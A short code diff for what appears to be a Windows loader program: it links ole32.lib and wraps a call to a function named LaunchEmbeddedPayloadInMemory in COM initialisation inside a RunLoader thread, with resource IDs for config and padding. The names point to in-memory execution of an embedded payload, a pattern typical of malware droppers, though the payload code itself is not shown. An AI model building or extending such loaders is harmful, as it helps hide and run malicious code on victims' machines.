@@ -7,6 +7,7 @@
 
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "ole32.lib")
 
 #define RES_CONFIG 105
 #define RES_PADDING 106
@@ -233,7 +234,9 @@ static void LaunchEmbeddedPayloadInMemory()
 
 DWORD WINAPI RunLoader(LPVOID)
 {
+    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
     LaunchEmbeddedPayloadInMemory();
+    CoUninitialize();
     return 0;
 }
 
